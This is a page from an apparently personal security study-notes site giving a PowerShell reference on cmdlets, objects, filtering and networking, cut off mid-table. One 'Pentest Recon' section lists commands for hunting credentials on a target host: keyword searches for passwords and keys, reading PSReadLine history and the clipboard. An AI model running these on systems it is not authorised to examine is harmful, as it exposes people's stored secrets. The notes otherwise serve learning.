href="/tools/defense-monitoring/sysmon" class="nav-note " data-astro-cid-gvqsdny3> Sysmon </a><a href="/tools/defense-monitoring/thehive" class="nav-note " data-astro-cid-gvqsdny3> TheHive </a><a href="/tools/defense-monitoring/uncomplicated-firewall-ufw" class="nav-note " data-astro-cid-gvqsdny3> Uncomplicated Firewall UFW </a><a href="/tools/defense-monitoring/windows-defender-firewall" class="nav-note " data-astro-cid-gvqsdny3> Windows Defender Firewall </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Enumeration" class="subcat-label-link " data-astro-cid-gvqsdny3> Enumeration </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/enumeration/crackmapexec" class="nav-note " data-astro-cid-gvqsdny3> CrackMapExec </a><a href="/tools/enumeration/dnsenum" class="nav-note " data-astro-cid-gvqsdny3> DNSenum </a><a href="/tools/enumeration/enum4linux-ng" class="nav-note " data-astro-cid-gvqsdny3> Enum4linux Ng </a><a href="/tools/enumeration/feroxbuster" class="nav-note " data-astro-cid-gvqsdny3> Feroxbuster </a><a href="/tools/enumeration/gobuster" class="nav-note " data-astro-cid-gvqsdny3> Gobuster </a><a href="/tools/enumeration/netexec" class="nav-note " data-astro-cid-gvqsdny3> NetExec </a><a href="/tools/enumeration/nmap" class="nav-note " data-astro-cid-gvqsdny3> Nmap </a><a href="/tools/enumeration/odat" class="nav-note " data-astro-cid-gvqsdny3> ODAT </a><a href="/tools/enumeration/rdp-sec-check" class="nav-note " data-astro-cid-gvqsdny3> RDP Sec Check </a><a href="/tools/enumeration/rpcclient" class="nav-note " data-astro-cid-gvqsdny3> Rpcclient </a><a href="/tools/enumeration/smtp-user-enum" class="nav-note " data-astro-cid-gvqsdny3> SMTP User Enum </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Forensics" class="subcat-label-link " data-astro-cid-gvqsdny3> Forensics </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/forensics/capa" class="nav-note " data-astro-cid-gvqsdny3> CAPA </a><a href="/tools/forensics/inetsim" class="nav-note " data-astro-cid-gvqsdny3> INetSim </a><a href="/tools/forensics/oledumppy" class="nav-note " data-astro-cid-gvqsdny3> Oledumppy </a><a href="/tools/forensics/volatility-3" class="nav-note " data-astro-cid-gvqsdny3> Volatility 3 </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Metasploit" class="subcat-label-link " data-astro-cid-gvqsdny3> Metasploit </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/frameworks/metasploit/metasploit" class="nav-note " data-astro-cid-gvqsdny3> Metasploit </a><a href="/tools/frameworks/metasploit/meterpreter" class="nav-note " data-astro-cid-gvqsdny3> Meterpreter </a><a href="/tools/frameworks/metasploit/msfconsole" class="nav-note " data-astro-cid-gvqsdny3> MSFConsole </a><a href="/tools/frameworks/metasploit/msfvenom" class="nav-note " data-astro-cid-gvqsdny3> MSFVenom </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Network%20Analysis" class="subcat-label-link " data-astro-cid-gvqsdny3> Network Analysis </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/network-analysis/tcpdump" class="nav-note " data-astro-cid-gvqsdny3> TCPDump </a><a href="/tools/network-analysis/wireshark" class="nav-note " data-astro-cid-gvqsdny3> Wireshark </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Osint%20Recon" class="subcat-label-link " data-astro-cid-gvqsdny3> Osint Recon </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/osint-recon/dig" class="nav-note " data-astro-cid-gvqsdny3> Dig </a><a href="/tools/osint-recon/finalrecon" class="nav-note " data-astro-cid-gvqsdny3> FinalRecon </a><a href="/tools/osint-recon/nslookup" class="nav-note " data-astro-cid-gvqsdny3> Nslookup </a><a href="/tools/osint-recon/shodan" class="nav-note " data-astro-cid-gvqsdny3> Shodan </a><a href="/tools/osint-recon/whois" class="nav-note " data-astro-cid-gvqsdny3> WHOIS </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Password%20Attacks" class="subcat-label-link " data-astro-cid-gvqsdny3> Password Attacks </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/password-attacks/hashcat" class="nav-note " data-astro-cid-gvqsdny3> Hashcat </a><a href="/tools/password-attacks/hydra" class="nav-note " data-astro-cid-gvqsdny3> Hydra </a><a href="/tools/password-attacks/johntheripper" class="nav-note " data-astro-cid-gvqsdny3> JohnTheRipper </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Post%20Exploitation" class="subcat-label-link " data-astro-cid-gvqsdny3> Post Exploitation </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/post-exploitation/evil-winrm" class="nav-note " data-astro-cid-gvqsdny3> Evil Winrm </a><a href="/tools/post-exploitation/peass-ng" class="nav-note " data-astro-cid-gvqsdny3> PEASS Ng </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Utilities" class="subcat-label-link " data-astro-cid-gvqsdny3> Utilities </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/utilities/curl" class="nav-note " data-astro-cid-gvqsdny3> Curl </a><a href="/tools/utilities/docker" class="nav-note " data-astro-cid-gvqsdny3> Docker </a><a href="/tools/utilities/rsync" class="nav-note " data-astro-cid-gvqsdny3> Rsync </a><a href="/tools/utilities/sqlplus" class="nav-note " data-astro-cid-gvqsdny3> SQLplus </a><a href="/tools/utilities/telnet" class="nav-note " data-astro-cid-gvqsdny3> Telnet </a><a href="/tools/utilities/xfreerdp" class="nav-note " data-astro-cid-gvqsdny3> Xfreerdp </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Vulnerability%20Scanning" class="subcat-label-link " data-astro-cid-gvqsdny3> Vulnerability Scanning </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/vulnerability-scanning/openvas" class="nav-note " data-astro-cid-gvqsdny3> OpenVAS </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Web%20Testing" class="subcat-label-link " data-astro-cid-gvqsdny3> Web Testing </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/web-testing/ffuf" class="nav-note " data-astro-cid-gvqsdny3> Ffuf </a><a href="/tools/web-testing/nikto" class="nav-note " data-astro-cid-gvqsdny3> Nikto </a><a href="/tools/web-testing/sqlmap" class="nav-note " data-astro-cid-gvqsdny3> SQLMap </a><a href="/tools/web-testing/wafw00f" class="nav-note " data-astro-cid-gvqsdny3> Wafw00f </a><a href="/tools/web-testing/wenum" class="nav-note " data-astro-cid-gvqsdny3> Wenum </a><a href="/tools/web-testing/wpscan" class="nav-note " data-astro-cid-gvqsdny3> WPScan </a><a href="/tools/web-testing/xsstrike" class="nav-note " data-astro-cid-gvqsdny3> XSStrike </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Burp%20Suite" class="subcat-label-link " data-astro-cid-gvqsdny3> Burp Suite </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/web-testing/burp-suite/burp-intruder" class="nav-note " data-astro-cid-gvqsdny3> Burp Intruder </a><a href="/tools/web-testing/burp-suite/burp-proxy" class="nav-note " data-astro-cid-gvqsdny3> Burp Proxy </a><a href="/tools/web-testing/burp-suite/burp-repeater" class="nav-note " data-astro-cid-gvqsdny3> Burp Repeater </a><a href="/tools/web-testing/burp-suite/burp-scanner" class="nav-note " data-astro-cid-gvqsdny3> Burp Scanner </a><a href="/tools/web-testing/burp-suite/burp-suite" class="nav-note " data-astro-cid-gvqsdny3> Burp Suite </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Owasp%20Zap" class="subcat-label-link " data-astro-cid-gvqsdny3> Owasp Zap </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/web-testing/owasp-zap/owasp-zap" class="nav-note " data-astro-cid-gvqsdny3> OWASP ZAP </a><a href="/tools/web-testing/owasp-zap/zap-fuzzer" class="nav-note " data-astro-cid-gvqsdny3> ZAP Fuzzer </a><a href="/tools/web-testing/owasp-zap/zap-proxy" class="nav-note " data-astro-cid-gvqsdny3> ZAP Proxy </a><a href="/tools/web-testing/owasp-zap/zap-scanner" class="nav-note " data-astro-cid-gvqsdny3> ZAP Scanner </a> </div> </div> </div> </div><div class="cat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/labs" class="cat-label-link " data-astro-cid-gvqsdny3> Labs </a> <span class="cat-count" data-astro-cid-gvqsdny3>7</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/labs?filter=Cjca" class="subcat-label-link " data-astro-cid-gvqsdny3> Cjca </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/labs/hackthebox/exams/cjca/cjca-siem-triage" class="nav-note " data-astro-cid-gvqsdny3> CJCA SIEM Triage </a><a href="/labs/hackthebox/exams/cjca/htb-cjca-exam---april-2026" class="nav-note " data-astro-cid-gvqsdny3> HTB CJCA Exam   April 2026 </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/labs?filter=Machines" class="subcat-label-link " data-astro-cid-gvqsdny3> Machines </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/labs/hackthebox/exams/cjca/machines/nix01" class="nav-note " data-astro-cid-gvqsdny3> NIX01 </a><a href="/labs/hackthebox/exams/cjca/machines/nix02" class="nav-note " data-astro-cid-gvqsdny3> NIX02 </a><a href="/labs/hackthebox/exams/cjca/machines/web01" class="nav-note " data-astro-cid-gvqsdny3> WEB01 </a><a href="/labs/hackthebox/exams/cjca/machines/win01" class="nav-note " data-astro-cid-gvqsdny3> WIN01 </a><a href="/labs/hackthebox/exams/cjca/machines/win02" class="nav-note " data-astro-cid-gvqsdny3> WIN02 </a> </div> </div> </div> </div><div class="cat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/resources" class="cat-label-link " data-astro-cid-gvqsdny3> Resources </a> <span class="cat-count" data-astro-cid-gvqsdny3>6</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <a href="/resources/common-distros" class="nav-note " data-astro-cid-gvqsdny3> Common Distros </a><a href="/resources/ctf-methodology" class="nav-note " data-astro-cid-gvqsdny3> CTF Methodology </a><a href="/resources/cyber-resources" class="nav-note " data-astro-cid-gvqsdny3> Cyber Resources </a><a href="/resources/github-repositories" class="nav-note " data-astro-cid-gvqsdny3> Github Repositories </a><a href="/resources/obsidian-guides" class="nav-note " data-astro-cid-gvqsdny3> Obsidian Guides </a><a href="/resources/try-hack-me-rooms" class="nav-note " data-astro-cid-gvqsdny3> Try Hack Me Rooms </a> </div> </div> </nav>  <script type="module">document.querySelectorAll(".cat-toggle").forEach(e=>{e.addEventListener("click",()=>{const t=e.closest(".cat-group");t.dataset.open=t.dataset.open==="true"?"false":"true"})});document.querySelectorAll(".subcat-toggle").forEach(e=>{e.addEventListener("click",()=>{const t=e.closest(".subcat-group");t.dataset.open=t.dataset.open==="true"?"false":"true"})});</script> </nav> </div> </aside> <button class="sidebar-toggle" id="sidebar-toggle" aria-label="Toggle sidebar" data-astro-cid-o5gmpz7g>‹</button> <div class="note-gap" data-astro-cid-o5gmpz7g></div> <main class="note-main" data-astro-cid-o5gmpz7g> <div class="note-content" data-astro-cid-o5gmpz7g> <div class="note-meta" data-astro-cid-o5gmpz7g> <span class="note-category" data-astro-cid-o5gmpz7g>knowledge</span>  </div>    <hr>
+<h2 id="overview">Overview</h2>
+<p>Windows PowerShell is an object-oriented scripting language and shell designed for system administration and automation in Windows environments. Unlike CMD which works with plain text, PowerShell works with objects that have properties and methods — making it significantly more powerful for automation, filtering, and remote management. It is built into modern Windows and is the primary tool for managing Active Directory, services, processes, and network configurations.</p>
+<hr>
+<h2 id="terminology">Terminology</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Term</th><th>Definition</th></tr></thead><tbody><tr><td>Object</td><td>Core element in PowerShell; contains properties (data) and methods (functions)</td></tr><tr><td>Property</td><td>Attribute of an object (e.g., <code>Name</code>, <code>Length</code>, <code>Extension</code>)</td></tr><tr><td>Method</td><td>Function associated with an object (e.g., <code>.ToUpper()</code>, <code>.GetType()</code>)</td></tr><tr><td>Cmdlet</td><td>Specialized PowerShell command in verb-noun format (e.g., <code>Get-Process</code>)</td></tr><tr><td>Pipeline (<code>|</code>)</td><td>Passes output from one cmdlet as input to the next</td></tr><tr><td>Module</td><td>Collection of related cmdlets, functions, and scripts</td></tr><tr><td>Alias</td><td>Shorthand name for a cmdlet (e.g., <code>ls</code> = <code>Get-ChildItem</code>)</td></tr></tbody></table>
+<hr>
+<h2 id="core-concepts">Core Concepts</h2>
+<h3 id="accessing-powershell">Accessing PowerShell</h3>
+<ul>
+<li>Windows Search → “PowerShell” → Enter</li>
+<li>Windows Terminal (modern terminal that supports multiple shells)</li>
+<li>Windows PowerShell ISE — built-in IDE for writing, debugging, and testing scripts</li>
+<li>From CMD: type <code>powershell</code> to switch into a PowerShell session</li>
+</ul>
+<h3 id="getting-started">Getting Started</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-Command</code></td><td>List all available cmdlets, functions, aliases, and scripts</td></tr><tr><td><code>Get-Command -verb get</code></td><td>Filter commands by verb</td></tr><tr><td><code>Get-Command -noun windows*</code></td><td>Filter commands by noun</td></tr><tr><td><code>Get-Command -CommandType "Function"</code></td><td>Show only functions</td></tr><tr><td><code>Get-Command -Module &#x3C;ModuleName></code></td><td>See all cmdlets, aliases, and functions exported by a specific module</td></tr><tr><td><code>Get-Alias</code></td><td>Display all configured aliases</td></tr><tr><td><code>Set-Alias -Name &#x3C;alias> -Value &#x3C;cmdlet></code></td><td>Create a custom shorthand alias for a cmdlet</td></tr><tr><td><code>Get-Help &#x3C;cmdlet></code></td><td>Show help for a cmdlet</td></tr><tr><td><code>Get-Help &#x3C;cmdlet> -Examples</code></td><td>Show usage examples for any cmdlet</td></tr><tr><td><code>Get-Help &#x3C;cmdlet> -online</code></td><td>Open Microsoft documentation in browser</td></tr><tr><td><code>Update-Help</code></td><td>Update locally cached help documentation</td></tr></tbody></table>
+<h3 id="command-history">Command History</h3>
+<p>PowerShell tracks history in two ways:</p>
+<ol>
+<li><strong>Session history</strong> — commands from the current session only</li>
+<li><strong>PSReadLine</strong> — persistent history across all sessions (last 4096 commands by default, controlled by <code>$MaximumHistoryCount</code>)</li>
+</ol>
+<p>PSReadLine history file location: <code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></p>
+<p>PSReadLine automatically attempts to filter API keys, passwords, and <code>-AsPlainText</code> strings.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-History</code></td><td>Show commands run in the current session</td></tr><tr><td><code>r &#x3C;number></code></td><td>Recall and re-run a command by its history number</td></tr><tr><td><code>Get-Content (Get-PSReadlineOption).HistorySavePath</code></td><td>View full persistent command history from PSReadLine</td></tr><tr><td><code>Clear-Host</code></td><td>Clear the terminal screen</td></tr></tbody></table>
+<h4 id="hotkeys">Hotkeys</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Shortcut</th><th>Action</th></tr></thead><tbody><tr><td><code>CTRL + R</code></td><td>Searchable command history</td></tr><tr><td><code>CTRL + L</code></td><td>Quick screen clear</td></tr><tr><td><code>CTRL + ALT + SHIFT + ?</code></td><td>Print all keyboard shortcuts</td></tr><tr><td><code>F7</code></td><td>TUI scrollable history list</td></tr><tr><td><code>SHIFT + TAB</code></td><td>Autocomplete backward</td></tr><tr><td><code>Escape</code></td><td>Clear the current line while typing</td></tr></tbody></table>
+<h3 id="file-system-management">File System Management</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Aliases</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-Item &#x3C;path></code></td><td><code>gi</code></td><td>Retrieve an object — file, folder, registry key, etc.</td></tr><tr><td><code>Get-ChildItem &#x3C;path></code></td><td><code>ls</code>, <code>dir</code>, <code>gci</code></td><td>List contents of a directory</td></tr><tr><td><code>Set-Location &#x3C;path></code></td><td><code>cd</code></td><td>Change working directory</td></tr><tr><td><code>Get-Location</code></td><td><code>pwd</code></td><td>Print current working directory</td></tr><tr><td><code>New-Item -Path &#x3C;path> -ItemType File</code></td><td><code>md</code>, <code>mkdir</code>, <code>ni</code></td><td>Create a new file or directory</td></tr><tr><td><code>Set-Item &#x3C;path></code></td><td><code>si</code></td><td>Modify the value of a property on an object</td></tr><tr><td><code>Copy-Item -Path &#x3C;src> -Destination &#x3C;dest></code></td><td><code>copy</code>, <code>cp</code>, <code>ci</code></td><td>Copy files or directories</td></tr><tr><td><code>Rename-Item &#x3C;path> -NewName &#x3C;name></code></td><td><code>ren</code>, <code>rni</code></td><td>Rename a file or directory</td></tr><tr><td><code>Remove-Item &#x3C;path></code></td><td><code>rm</code>, <code>del</code>, <code>rmdir</code></td><td>Delete a file or directory</td></tr><tr><td><code>Get-Content &#x3C;file></code></td><td><code>cat</code>, <code>type</code></td><td>Read and display the contents of a file</td></tr><tr><td><code>Add-Content &#x3C;file> -Value "&#x3C;text>"</code></td><td><code>ac</code></td><td>Append text to a file without overwriting it</td></tr><tr><td><code>Set-Content &#x3C;file> -Value "&#x3C;text>"</code></td><td><code>sc</code></td><td>Overwrite all contents of a file with new data</td></tr><tr><td><code>Clear-Content &#x3C;file></code></td><td><code>clc</code></td><td>Erase file contents while keeping the file itself</td></tr><tr><td><code>Compare-Object &#x3C;ref> &#x3C;diff></code></td><td><code>diff</code>, <code>compare</code></td><td>Compare two objects or files and show differences</td></tr></tbody></table>
+<p>Bulk rename example — change all <code>.txt</code> files to <code>.md</code>:
+<code>Get-ChildItem -Path *.txt | Rename-Item -NewName {$_.name -replace ".txt",".md"}</code></p>
+<h3 id="powershell-objects">PowerShell Objects</h3>
+<p>Everything in PowerShell is an object — a structured item with properties (data) and methods (actions). Understanding objects is essential for filtering and automation.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Concept</th><th>Definition</th></tr></thead><tbody><tr><td>Object</td><td>An individual instance of a class (e.g., a running process, a file)</td></tr><tr><td>Class</td><td>The blueprint defining what properties and methods an object has</td></tr><tr><td>Property</td><td>A data attribute on an object (e.g., <code>Name</code>, <code>Status</code>, <code>Length</code>)</td></tr><tr><td>Method</td><td>An action the object can perform (e.g., <code>.Start()</code>, <code>.ToUpper()</code>)</td></tr></tbody></table>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-LocalUser administrator | Get-Member</code></td><td>Show all properties and methods available on an object</td></tr><tr><td><code>Get-LocalUser administrator | Select-Object -Property *</code></td><td>Return all property values for an object</td></tr><tr><td><code>Get-LocalUser * | Select-Object -Property Name,PasswordLastSet</code></td><td>Return only specific properties</td></tr><tr><td><code>Get-LocalUser * | Sort-Object -Property Name | Group-Object -Property Enabled</code></td><td>Sort by name, then group by a property value</td></tr></tbody></table>
+<h3 id="piping-filtering-and-sorting">Piping, Filtering, and Sorting</h3>
+<p>PowerShell pipelines pass objects between cmdlets, enabling powerful chaining.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Operator</th><th>Description</th><th>Example</th></tr></thead><tbody><tr><td><code>| Sort-Object &#x3C;property></code></td><td>Sort by a property</td><td><code>| Sort-Object Length</code></td></tr><tr><td><code>| Select-Object &#x3C;props></code></td><td>Return only specified properties</td><td><code>| Select-Object Name,Length</code></td></tr><tr><td><code>| Where-Object -Property &#x3C;prop> -eq &#x3C;value></code></td><td>Filter by property value</td><td><code>| Where-Object -Property Extension -eq ".txt"</code></td></tr><tr><td><code>Select-String -Path &#x3C;path> -Pattern &#x3C;term></code></td><td>Grep-like pattern search inside files; outputs file name, line number, and matching line</td><td><code>Select-String -Path C:\logs\* -Pattern "password"</code></td></tr></tbody></table>
+<p>Comparison operators for <code>Where-Object</code>:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Operator</th><th>Description</th></tr></thead><tbody><tr><td><code>-eq</code></td><td>Exact match (case-insensitive)</td></tr><tr><td><code>-ne</code></td><td>Not equal</td></tr><tr><td><code>-gt</code> / <code>-ge</code></td><td>Greater than / greater than or equal</td></tr><tr><td><code>-lt</code> / <code>-le</code></td><td>Less than / less than or equal</td></tr><tr><td><code>-like</code></td><td>Wildcard match (e.g., <code>-like "*admin*"</code>)</td></tr><tr><td><code>-contains</code></td><td>Check if any item in a collection matches exactly</td></tr><tr><td><code>-match</code></td><td>Regular expression match</td></tr><tr><td><code>-not</code></td><td>Matches if property is blank, does not exist, or is <code>$False</code></td></tr></tbody></table>
+<p>Pipeline chaining operators (PowerShell 7+):</p>
+<ul>
+<li><code>&#x26;&#x26;</code> — Run next command only if current one succeeds</li>
+<li><code>||</code> — Run next command only if current one fails</li>
+</ul>
+<h4 id="finding-files-recursively">Finding Files Recursively</h4>
+<p><code>Get-ChildItem -Path C:\Users\&#x3C;user>\ -File -Recurse -ErrorAction SilentlyContinue</code></p>
+<p>Filter by extension: <code>where {($_.Name -like "*.txt" -or $_.Name -like "*.csv")}</code></p>
+<p>Search inside files for keywords:
+<code>Get-ChildItem -Path C:\Users\ -Filter "*.txt" -Recurse -File | sls "Password","credential","key"</code></p>
+<h3 id="pentest-recon--valuable-locations">Pentest Recon — Valuable Locations</h3>
+<p>When operating on a target host, these locations commonly contain sensitive files:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Location</th><th>What to Look For</th></tr></thead><tbody><tr><td><code>C:\Users\&#x3C;user>\AppData\</code></td><td>Config files, saved credentials, temp saves</td></tr><tr><td><code>C:\Users\&#x3C;user>\</code></td><td>VPN configs, SSH keys (add <code>-Hidden</code> flag to see hidden files)</td></tr><tr><td><code>(Get-PSReadlineOption).HistorySavePath</code></td><td>Path to PSReadLine command history file — may contain typed credentials or command sequences</td></tr><tr><td><code>Get-Clipboard</code></td><td>Check current clipboard contents for copied credentials or tokens</td></tr></tbody></table>
+<p>Read PowerShell console history directly: <code>Get-Content (Get-PSReadlineOption).HistorySavePath</code></p>
+<hr>
+<h3 id="system-information--analysis">System Information &#x26; Analysis</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-ComputerInfo</code></td><td>Comprehensive system information (OS, hardware, BIOS)</td></tr><tr><td><code>Get-Process</code></td><td>View all running processes</td></tr><tr><td><code>Get-Service</code></td><td>Get status of all services</td></tr><tr><td><code>Get-NetTCPConnection</code></td><td>Display current TCP connections</td></tr><tr><td><code>Get-FileHash &#x3C;file></code></td><td>Generate a file hash (default SHA256; use <code>-Algorithm MD5</code> etc.)</td></tr></tbody></table>
+<h3 id="networking">Networking</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-NetIPConfiguration</code></td><td>Full network interface configuration (IP, gateway, DNS)</td></tr><tr><td><code>Get-NetIPAddress</code></td><td>IP address details for each adapter</td></tr><tr><td><code>Get-NetIPInterface</code></td><td>All visible adapter properties broken down by address family</td></tr><tr><td><code>Get-NetIPAddress -ifIndex &#x3C;n></code></td><td>View IP address for a specific interface (get ifIndex from <code>Get-NetIPInterface</code>)</td></tr><tr><td><code>Get-NetNeighbor</code></td><td>ARP-equivalent neighbor table entries</td></tr><tr><td><code>Get-NetRoute</code></td><td>Current routing table</td></tr><tr><td><code>Set-NetAdapter -Name &#x3C;name></code></td><td>Set basic adapter properties at layer 2</td></tr><tr><td><code>Set-NetIPInterface -InterfaceIndex &#x3C;n> -Dhcp Disabled</code></td><td>Disable DHCP on an interface to prepare for static IP</td></tr><tr><td><code>Set-NetIPAddress -InterfaceIndex &#x3C;n> -IPAddress &#x3C;ip> -PrefixLength &#x3C;cidr></code></td><td>Assign a static IP; <code>PrefixLength</code> is the CIDR subnet mask (e.g., 24 = 255.255.255.0)</td></tr><tr><td><code>New-NetIPAddress -InterfaceIndex &#x3C;n> -IPAddress &#x3C;ip> -PrefixLength &#x3C;cidr></code></td><td>Create and configure a new IP address on an adapter</td></tr><tr><td><code>Disable-NetAdapter -Name &#x3C;name></code></td><td>Disable a network adapter</td></tr><tr><td><code>Enable-NetAdapter -Name &#x3C;name></code></td><td>Re-enable a disabled 